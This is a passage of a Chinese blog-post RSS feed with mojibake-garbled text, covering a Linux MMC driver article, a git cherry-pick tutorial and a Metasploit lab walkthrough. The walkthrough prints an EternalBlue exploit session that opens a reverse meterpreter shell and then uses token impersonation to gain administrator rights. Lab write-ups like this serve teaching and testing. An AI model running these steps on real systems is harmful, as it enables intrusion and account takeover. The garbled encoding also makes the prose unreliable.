    err &lt;/span&gt;=&lt;span&gt; mmc_retune(host);
    ...
    host&lt;/span&gt;-&amp;gt;ops-&amp;gt;&lt;span&gt;request(host, mrq);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;span&gt;ç»¼åˆä¸Šè¿°åˆ†æï¼Œå¯ä»¥å°†MMCé©±åŠ¨å­ç³»ç»Ÿæµç¨‹åˆ†ææ¦‚æ‹¬ä¸ºä¸‹å›¾ã€‚ä»é©±åŠ¨ç¼–å†™çš„è§’åº¦ï¼Œåªéœ€å…³æ³¨MMC cardè®¾å¤‡æ³¨å†Œç›¸å…³ä»£ç ï¼Œä¸»è¦åŒ…å«å¦‚ä¸‹å‡ ä¸ªæ–¹é¢ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;å°†mmc hostå°è£…è¿›ä¸€ä¸ªÂ &lt;span class=&quot;cnblogs_code&quot;&gt;platform device&lt;/span&gt;Â ï¼ŒåŒæ—¶å®šä¹‰ä¸€Â &lt;span class=&quot;cnblogs_code&quot;&gt;platform driver&lt;/span&gt;Â ï¼Œå¹¶å°†å®ƒä»¬æ³¨å†Œåˆ°é©±åŠ¨æ¨¡å‹ä¸­&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;platform driver&lt;/span&gt;Â çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;probe()&lt;/span&gt;Â å‡½æ•°ä¸­è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_alloc_host()&lt;/span&gt;Â å’ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_host()&lt;/span&gt;Â ï¼Œå°†mmc cardæ³¨å†Œåˆ°é©±åŠ¨æ¨¡å‹ä¸­&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://hughesxu.github.io/assets/img/sample/mmc_subsystem_driver_model.svg&quot; alt=&quot;MMC subsystem Driver Model&quot; width=&quot;1799&quot; height=&quot;1532&quot; data-loaded=&quot;true&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;Â &lt;/h2&gt;
&lt;h2&gt;Â &lt;/h2&gt;
&lt;h2 id=&quot;å‚è€ƒèµ„æ–™&quot;&gt;å‚è€ƒèµ„æ–™&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;[1] Linuxè®¾å¤‡é©±åŠ¨å¼€å‘è¯¦è§£ï¼ˆåŸºäºæœ€æ–°çš„Linux4.0å†…æ ¸ï¼‰ï¼Œå®‹å®åç¼–è‘—ï¼Œ2016å¹´&lt;/span&gt;&lt;br/&gt;&lt;span&gt;[2] Linux SD/MMC/SDIOé©±åŠ¨åˆ†æï¼š&lt;a href=&quot;https://www.cnblogs.com/cslunatic/p/3678045.html&quot;&gt;https://www.cnblogs.com/cslunatic/p/3678045.html&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Tue, 29 Sep 2020 12:19:00 +0000</pubDate>
<dc:creator>hueyxu</dc:creator>
<og:description>Linuxå†…æ ¸è®¾è®¡äº†MMCå­ç³»ç»Ÿï¼Œç”¨äºç®¡ç†MMC/SDè®¾å¤‡ã€‚æœ¬æ–‡é€šè¿‡å†…æ ¸æºç ï¼ˆLinux Kernel 5.2ï¼‰å¯¹MMCé©±åŠ¨å­ç³»ç»Ÿè¿›è¡Œç®€è¿°ï¼Œé€šè¿‡MMCé©±åŠ¨çš„å®é™…æ¡ˆä¾‹è¯´æ˜MMCé©±åŠ¨ç¼–å†™çš„ä¸€èˆ¬æ­¥éª¤ï¼Œå¹¶åˆ†æ</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/hueyxu/p/13751636.html</dc:identifier>
</item>
<item>
<title>git  ä¸€ä¸ªå¯ä»¥æé«˜å¼€å‘æ•ˆç‡çš„å‘½ä»¤ï¼šcherry-pick - è‰¯è®¸Linux</title>
<link>http://www.cnblogs.com/yychuyu/p/13751649.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yychuyu/p/13751649.html</guid>
<description>&lt;p&gt;å„ä½ç å†œæœ‹å‹ä»¬ä¸€å®šæœ‰ç¢°åˆ°è¿‡è¿™æ ·çš„æƒ…å†µï¼šåœ¨developåˆ†æ”¯ä¸Šè¾›è¾›è‹¦è‹¦æ’¸äº†ä¸€é€šä»£ç åå¼€å‘å‡ºåŠŸèƒ½æ¨¡å—Aï¼ŒBï¼ŒCï¼Œè¿™æ—¶è€æ¿è¿‡æ¥è¯´ï¼Œå¹´é’äººï¼Œæˆ‘ä»¬ç°åœ¨å…ˆä¸Šçº¿åŠŸèƒ½æ¨¡å—Aï¼ŒBã€‚ä½ ä¸€å®šå¿ƒé‡Œä¸€ä¸‡åªè‰æ³¥é©¬å¥”è…¾è€Œè¿‡ï¼Œä½†ä¸ºäº†æ··å£é¥­åƒå¿…é¡»å¾—æŒ‰è€æ¿çš„æ„æ€åŠäº‹å•Šã€‚&lt;/p&gt;
&lt;p&gt;æ€ä¹ˆåŠï¼Ÿä¸€ä¸ªåŠæ³•å°±æ˜¯ï¼Œé‡æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œç„¶åå†æŠŠåŠŸèƒ½æ¨¡å—Cå›é€€ï¼Œç•™ä¸‹åŠŸèƒ½æ¨¡å—Aï¼ŒBã€‚è¿™ç§åšæ³•ä¸æ˜¯ä¸è¡Œï¼Œä½†æ˜¯æœ‰æ›´å¥½çš„åŠæ³•ï¼Œé‚£å°±æ˜¯gitæ‰€æä¾›çš„cherry-pickåŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p&gt;cherry-pickç±»ä¼¼äºä¸€ä¸ªå®šåˆ¶åŒ–çš„mergeï¼Œå®ƒå¯ä»¥æŠŠå…¶å®ƒåˆ†æ”¯ä¸Šçš„commitä¸€ä¸ªä¸ªæ‘˜ä¸‹æ¥ï¼Œåˆå¹¶åˆ°å½“å‰åˆ†æ”¯ã€‚&lt;/p&gt;
&lt;p&gt;åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šå®ä¾‹ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚æˆ‘ç°åœ¨æœ‰ä¸ªæ–‡ä»¶a.cï¼Œæˆ‘åœ¨developåˆ†æ”¯å®Œæˆäº†ä¸‰ä¸ªåŠŸèƒ½æ¨¡å—ï¼šfeature Aï¼Œfeature Bï¼Œfeature Cã€‚å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1218435/202009/1218435-20200929201721574-824982021.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨ï¼Œå‘çˆ¹çš„è€æ¿åªè¦feature Aï¼Œfeature Bï¼Œæˆ‘ä»¬ç°åœ¨ç”¨cherry-pickå‘½ä»¤ç›´æ¥æŠŠfeature Aï¼Œfeature Bçš„æäº¤åˆå¹¶åˆ°masteråˆ†æ”¯é‡Œï¼Œå¦‚ä¸‹æ“ä½œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1218435/202009/1218435-20200929201724450-1851859502.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼ŒåŠŸèƒ½æ¨¡å—feature Aï¼Œfeature Bå·²ç»è¢«åˆå¹¶åˆ°masteråˆ†æ”¯é‡Œã€‚è¯·æ³¨æ„ï¼Œåˆå¹¶åˆ°masteråˆ†æ”¯é‡Œçš„æäº¤å“ˆå¸Œå€¼å‘ç”Ÿäº†æ”¹å˜ï¼Œä¸åŸæ¥çš„ä¸åŒã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹å‡ºï¼Œcherry-pickå‘½ä»¤ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œå³ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;git cherry-pick commitID
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;åˆšåˆšæ˜¯ä¸€ä¸ªä¸ªæäº¤cherry-pickåˆ°masteråˆ†æ”¯ï¼Œä½†å¦‚æœæœ‰100ä¸ªcommitè¦åˆå¹¶åˆ°masteråˆ†æ”¯å‘¢ï¼Ÿæ€»ä¸èƒ½è¿™æ ·ä¸€ä¸ªä¸ªæ“ä½œå§ï¼Ÿgitä¸€æ ·å¸®ä½ æƒ³åˆ°äº†ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªåŒºé—´æ“ä½œæ–¹æ³•ã€‚å…·ä½“æ¥è®²æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;git cherry-pick commit1..commit100
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ä½†æ˜¯è¦æ³¨æ„ï¼Œè¿™æ˜¯ä¸€ä¸ªå·¦å¼€å³é—­çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œcommit1ä¸ä¼šè¢«åˆå¹¶åˆ°masteråˆ†æ”¯ï¼Œè€Œcommit100åˆ™ä¼šã€‚è¿™æ ·çš„è¯ä¸Šé¢çš„éœ€æ±‚å¯ä»¥å¦‚ä¸‹æ“ä½œæ¥å®ç°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1218435/202009/1218435-20200929201726828-1900746941.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šä¸Šé¢è®²åˆ°cherry-pickå‘½ä»¤æ¯æ‹£é€‰ä¸€ä¸ªcommitå°±ä¼šæäº¤ä¸€æ¬¡ç”Ÿæˆä¸€ä¸ªæ–°çš„commit idã€‚ å¦‚æœæˆ‘ä»¬æƒ³è®©æ¯ä¸ªcommit æ‹£é€‰åæš‚ç¼“æäº¤ï¼Œç­‰åˆ°æ‰€æœ‰commitéƒ½æ‹£é€‰å®Œæˆåï¼Œè‡ªå·±æ‰‹åŠ¨commitï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ç”¨-n é€‰é¡¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1218435/202009/1218435-20200929201729635-161268220.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;æ€æ ·ï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿå­¦ä¼šäº†cherry-pickå‘½ä»¤å¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒè€æ¿æ—¶ä¸æ—¶çš„å¤´è„‘å‘çƒ­äº†ã€‚å¿«æ‰«æä¸‹æ–¹äºŒç»´ç å’Œè‰¯è®¸ä¸€èµ·å­¦ä¹ æ›´å¤šgitç¥æ“ä½œï¼&lt;/p&gt;
&lt;p&gt;æ›´å¤šç²¾å½©å†…å®¹ï¼Œè¯·å…³æ³¨å…¬ä¼—å·&lt;strong&gt;è‰¯è®¸Linux&lt;/strong&gt;ï¼Œå…¬ä¼—å†…å›å¤&lt;strong&gt;1024&lt;/strong&gt;å¯å…è´¹è·å¾—5TæŠ€æœ¯èµ„æ–™ï¼ŒåŒ…æ‹¬ï¼š&lt;strong&gt;Linuxï¼ŒC/C++ï¼ŒPythonï¼Œæ ‘è“æ´¾ï¼ŒåµŒå…¥å¼ï¼ŒJavaï¼Œäººå·¥æ™ºèƒ½&lt;/strong&gt;ï¼Œç­‰ç­‰ã€‚å…¬ä¼—å·å†…å›å¤&lt;strong&gt;è¿›ç¾¤&lt;/strong&gt;ï¼Œé‚€è¯·æ‚¨è¿›é«˜æ‰‹å¦‚äº‘æŠ€æœ¯äº¤æµç¾¤ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://pbe9kvqil.bkt.clouddn.com/FmsDX2j5rcQ7DjY8p-KYTN7m5uNu&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;å…¬ä¼—å·ï¼šè‰¯è®¸Linux&lt;/p&gt;
&lt;img src=&quot;https://pic.downk.cc/item/5e618d2f98271cb2b8f65fe8.jpg&quot;/&gt;&lt;h3 id=&quot;æœ‰æ”¶è·ï¼Ÿå¸Œæœ›è€é“ä»¬æ¥ä¸ªä¸‰è¿å‡»ï¼Œç»™æ›´å¤šçš„äººçœ‹åˆ°è¿™ç¯‡æ–‡ç« &quot;&gt;æœ‰æ”¶è·ï¼Ÿå¸Œæœ›è€é“ä»¬æ¥ä¸ªä¸‰è¿å‡»ï¼Œç»™æ›´å¤šçš„äººçœ‹åˆ°è¿™ç¯‡æ–‡ç« &lt;/h3&gt;
</description>
<pubDate>Tue, 29 Sep 2020 12:18:00 +0000</pubDate>
<dc:creator>è‰¯è®¸Linux</dc:creator>
<og:description>å„ä½ç å†œæœ‹å‹ä»¬ä¸€å®šæœ‰ç¢°åˆ°è¿‡è¿™æ ·çš„æƒ…å†µï¼šåœ¨developåˆ†æ”¯ä¸Šè¾›è¾›è‹¦è‹¦æ’¸äº†ä¸€é€šä»£ç åå¼€å‘å‡ºåŠŸèƒ½æ¨¡å—Aï¼ŒBï¼ŒCï¼Œè¿™æ—¶è€æ¿è¿‡æ¥è¯´ï¼Œå¹´é’äººï¼Œæˆ‘ä»¬ç°åœ¨å…ˆä¸Šçº¿åŠŸèƒ½æ¨¡å—Aï¼ŒBã€‚ä½ ä¸€å®šå¿ƒé‡Œä¸€ä¸‡åªè‰æ³¥é©¬å¥”è…¾è€Œè¿‡ï¼Œä½†ä¸ºäº†</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yychuyu/p/13751649.html</dc:identifier>
</item>
<item>
<title>Metasploitä¹‹ä»¤ç‰Œçªƒå– - coderge</title>
<link>http://www.cnblogs.com/coderge/p/13751501.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/coderge/p/13751501.html</guid>
<description>&lt;p&gt;ä»¤ç‰Œ(Token) å°±æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶å¯†é’¥ï¼Œç›¸å½“äºè´¦æˆ·åå’Œå¯†ç ï¼Œç”¨æ¥å†³å®šæ˜¯å¦å…) è®¸è¿™æ¬¡è¯·æ±‚å’Œåˆ¤æ–­è¿™æ¬¡è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ã€‚å®ƒå…è®¸ä½ åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„å‰æä¸‹ï¼Œè®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºã€‚è¿™äº›ä»¤ç‰Œå°†æŒç»­å­˜åœ¨äºç³»ç»Ÿä¸­ï¼Œé™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨ã€‚&lt;br/&gt;ä»¤ç‰Œæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯éšæœºæ€§ï¼Œä¸å¯é¢„æµ‹ï¼Œä¸€èˆ¬é»‘å®¢æˆ–è½¯ä»¶æ— æ³•çŒœæµ‹å‡ºæ¥ã€‚ä»¤ç‰Œæœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚è®¿é—®ä»¤ç‰Œ(Access Token)è¡¨ç¤ºè®¿é—®æ§åˆ¶æ“ä½œä¸»é¢˜çš„ç³»ç»Ÿå¯¹è±¡ï¼›å¯†ä¿ä»¤ç‰Œ(Security token)ï¼Œåˆå«ä½œè®¤è¯ä»¤ç‰Œæˆ–è€…ç¡¬ä»¶ä»¤ç‰Œï¼Œæ˜¯ä¸€ç§è®¡ç®—æœºèº«ä»½æ ¡éªŒçš„ç‰©ç†è®¾å¤‡ï¼Œä¾‹å¦‚Uç›¾ï¼›ä¼šè¯ä»¤ç‰Œ(Session Token)æ˜¯äº¤äº’ä¼šè¯ä¸­å”¯ä¸€çš„èº«ä»½æ ‡è¯†ç¬¦ã€‚&lt;br/&gt;åœ¨å‡å†’ä»¤ç‰Œæ”»å‡»ä¸­éœ€è¦ä½¿ç”¨Kerberoståè®®ã€‚æ‰€ä»¥åœ¨ä½¿ç”¨å‡å†’ä»¤ç‰Œå‰ï¼Œå…ˆæ¥ä»‹ç»Kerberoståè®®ã€‚Kerberosæ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œå…¶è®¾è®¡ç›®æ ‡æ˜¯é€šè¿‡å¯†é’¥ç³»ç»Ÿä¸ºå®¢æˆ·æœº/æœåŠ¡å™¨åº”ç”¨ç¨‹åºæä¾›å¼ºå¤§çš„è®¤è¯æœåŠ¡ã€‚Kerberosçš„å·¥ä½œæœºåˆ¶å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2138744/202009/2138744-20200929191459999-2013212557.png&quot; alt=&quot;Kerberoså·¥ä½œæœºåˆ¶&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;å®¢æˆ·ç«¯è¯·æ±‚è¯ä¹¦çš„è¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;å®¢æˆ·ç«¯å‘è®¤è¯æœåŠ¡å™¨(AS)å‘é€è¯·æ±‚ï¼Œè¦æ±‚å¾—åˆ°æœåŠ¡å™¨çš„è¯ä¹¦ã€‚&lt;/li&gt;
&lt;li&gt;ASæ”¶åˆ°è¯·æ±‚åï¼Œå°†åŒ…å«å®¢æˆ·ç«¯å¯†é’¥çš„åŠ å¯†è¯ä¹¦å“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚è¯¥è¯ä¹¦åŒ…æ‹¬æœåŠ¡å™¨ticket (åŒ…æ‹¬æœåŠ¡å™¨å¯†é’¥åŠ å¯†çš„å®¢æˆ·æœºèº«ä»½å’Œä¸€ä»½ä¼šè¯å¯†é’¥)å’Œä¸€ä¸ªä¸´æ—¶åŠ så¯†å¯†é’¥(åˆç§°ä¸ºä¼šè¯å¯†é’¥ï¼Œsession key) ã€‚å½“ç„¶ï¼Œè®¤è¯æœåŠ¡å™¨ä¹Ÿä¼šç»™æœåŠ¡å™¨å‘é€ä¸€ä»½è¯¥è¯ä¹¦ï¼Œç”¨æ¥ä½¿æœåŠ¡å™¨è®¤è¯ç™»å½•å®¢æˆ·ç«¯çš„èº«ä»½ã€‚&lt;/li&gt;
&lt;li&gt;å®¢æˆ·ç«¯å°†ticketä¼ é€åˆ°æœåŠ¡å™¨ä¸Šï¼ŒæœåŠ¡å™¨ç¡®è®¤è¯¥å®¢æˆ·ç«¯çš„è¯ï¼Œä¾¿å…è®¸å®ƒç™»å½•æœåŠ¡å™¨ã€‚&lt;/li&gt;
&lt;li&gt;å®¢æˆ·ç«¯ç™»å½•æˆåŠŸåï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡å…¥ä¾µæœåŠ¡å™¨è·å–å®¢æˆ·ç«¯çš„ä»¤ç‰Œã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;æ”»å‡»æœºkaliï¼š192.168.1.104&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;é¶æœºwin7ï¼š192.168.1.102&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;msf5 &amp;gt; search ms17_010            # æœç´¢æ°¸æ’ä¹‹è“æ¼æ´åˆ©ç”¨æ¨¡å—

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   1  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   2  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
   3  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   4  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   5  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


msf5 &amp;gt; use exploit/windows/smb/ms17_010_eternalblue    # ç”¨è¿™ä¸ªæ¨¡å—ï¼Œæ³¨æ„ï¼Œé¶æœºåˆ«æ‰“è¡¥ä¸ï¼Œåˆ«å¼€é˜²ç«å¢™ï¼Œä»¥ä¿è¯è¯•éªŒæˆåŠŸ
msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp       # ç”¨è¿™ä¸ªpayload
payload =&amp;gt; windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set RHOST 192.168.1.102         # è®¾ç½®ç›®æ ‡æœºIP
RHOST =&amp;gt; 192.168.1.102
msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; set LHOST 192.168.1.104         # è®¾ç½®æ”»å‡»æœºIP
LHOST =&amp;gt; 192.168.1.104
msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; run                           # å¼€ç‚®å¼€ç‚®å¼€ç‚®ï¼ï¼ï¼

[*] Started reverse TCP handler on 192.168.1.104:4444 
[*] 192.168.1.102:445 - Connecting to target for exploitation.
[+] 192.168.1.102:445 - Connection established for exploitation.
[+] 192.168.1.102:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.102:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.1.102:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.1.102:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.1.102:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.1.102:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.102:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.102:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.102:445 - Starting non-paged pool grooming
[+] 192.168.1.102:445 - Sending SMBv2 buffers
[+] 192.168.1.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.102:445 - Sending final SMBv2 buffers.
[*] 192.168.1.102:445 - Sending last fragment of exploit packet!
[*] 192.168.1.102:445 - Receiving response from exploit packet
[+] 192.168.1.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.102:445 - Sending egg to corrupted connection.
[*] 192.168.1.102:445 - Triggering free of corrupted buffer.
[*] Sending stage (206403 bytes) to 192.168.1.102
[*] Meterpreter session 1 opened (192.168.1.104:4444 -&amp;gt; 192.168.1.102:49163) at 2020-09-29 19:22:08 +0800
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter &amp;gt;                                                # å¯ä»¥å¼€å¹²åäº‹å•¦

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æ­¤æ—¶æˆ‘ä»¬é€šè¿‡ä¸€ç³»åˆ—å‰æœŸæ¸—é€: &lt;a href=&quot;https://www.jianshu.com/p/03a1c13f963a&quot;&gt;https://www.jianshu.com/p/03a1c13f963a&lt;/a&gt;ï¼Œå·²ç»æˆåŠŸè·å¾—äº†ç›®æ ‡æœºçš„MeterpreterShellï¼Œé¦–å…ˆè¾“å…¥getuidå‘½ä»¤æŸ¥çœ‹å·²ç»è·å¾—çš„æƒé™ï¼Œç„¶åè¾“å…¥getsystemï¼Œå‘ç°ææƒå¤±è´¥ã€‚&lt;br/&gt;ï¼ˆå’¦ã€‚ã€‚ã€‚ç›´æ¥systemæƒé™æˆ‘é€ï¼Œç®—äº†ç»§ç»­åšï¼Œå½“ä½œæˆ‘æ²¡æœ‰çš„äºšå­â€¦â€¦&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2138744/202009/2138744-20200929192455730-1702726665.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆè¾“å…¥&lt;code&gt;use incognito&lt;/code&gt;å‘½ä»¤ï¼Œç„¶åè¾“å…¥&lt;code&gt;list_tokens -u&lt;/code&gt;åˆ—å‡ºå¯ç”¨çš„tokenå¦‚ä¸‹ï¼š&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2138744/202009/2138744-20200929192753449-1834236666.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ç§ç±»å‹çš„ä»¤ç‰Œ: ä¸€ç§æ˜¯Delegation Tokensï¼Œä¹Ÿå°±æ˜¯æˆæƒä»¤ç‰Œï¼Œå®ƒæ”¯æŒäº¤äº’å¼ç™»å½•(ä¾‹å¦‚å¯ä»¥é€šè¿‡è¿œç¨‹æ¡Œé¢ç™»å½•è®¿é—®) ï¼›è¿˜æœ‰ä¸€ç§æ˜¯Impersonation Tokensï¼Œä¹Ÿå°±æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œï¼Œå®ƒæ˜¯éäº¤äº’çš„ä¼šè¯ã€‚ä»¤ç‰Œçš„æ•°é‡å…¶å®å–å†³äºMeterpreter Shellçš„è®¿é—®çº§åˆ«ã€‚&lt;br/&gt;ç”±ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜geçš„æˆæƒä»¤ç‰Œï¼Œç°åœ¨å°±è¦å‡å†’è¿™ä¸ªä»¤ç‰Œï¼ŒæˆåŠŸåå³å¯æ‹¥æœ‰å®ƒçš„æƒé™ã€‚&lt;br/&gt;ä»è¾“å‡ºçš„ä¿¡æ¯å¯ä»¥çœ‹åˆ°åˆ†é…çš„æœ‰æ•ˆä»¤ç‰ŒåŒ…å«ge-PC\geï¼Œå…¶ä¸­ge-PCæ˜¯ç›®æ ‡æœºçš„ä¸»æœºåï¼Œgeè¡¨ç¤ºç™»å½•çš„ç”¨æˆ·åã€‚æ¥ä¸‹æ¥åœ¨incognitoä¸­è°ƒç”¨impersonate tokenå‘½ä»¤å‡å†’geç”¨æˆ·è¿›è¡Œæ”»å‡»ï¼Œå…·ä½“æ–¹æ³•å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2138744/202009/2138744-20200929193411684-336758425.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ³¨æ„ï¼šåœ¨è¾“å…¥HOSTNAME\USERNAMEæ—¶éœ€è¦ä¸¤ä¸ªåæ–œæ ï¼ˆ\ï¼‰&lt;/strong&gt;&lt;br/&gt;è¿è¡ŒæˆåŠŸååœ¨Meterpreter Shellä¸‹è¿è¡Œshellå‘½ä»¤å¹¶è¾“å…¥whoamiï¼Œå¯ä»¥çœ‹åˆ°ç¬”è€…ç°åœ¨å°±æ˜¯å‡å†’çš„é‚£ä¸ªge-pc\geç³»ç»Ÿç®¡ç†å‘˜äº†ã€‚&lt;/p&gt;

&lt;p&gt;æœ¬æ–‡å‚è€ƒ å¼€ç¯‡çš„åšå®¢é“¾æ¥ åŠ ã€ŠWebå®‰å…¨æ”»é˜²ï¼šæ¸—é€æµ‹è¯•å®æˆ˜æŒ‡å—ã€‹&lt;br/&gt;æ‰€æœ‰è¿‡ç¨‹ä»…ä¾›æ¼”ç¤ºäº¤æµï¼Œ&lt;strong&gt;ç¦æ­¢ç”¨äºéæ³•ç”¨é€”&lt;/strong&gt;ï¼Œç”±æ­¤äº§ç”Ÿçš„éæ³•åæœä¸æˆ‘æ— ç“œï¼ï¼ï¼&lt;/p&gt;
</description>
<pubDate>Tue, 29 Sep 2020 11:40:00 +0000</pubDate>
<dc:creator>coderge</dc:creator>
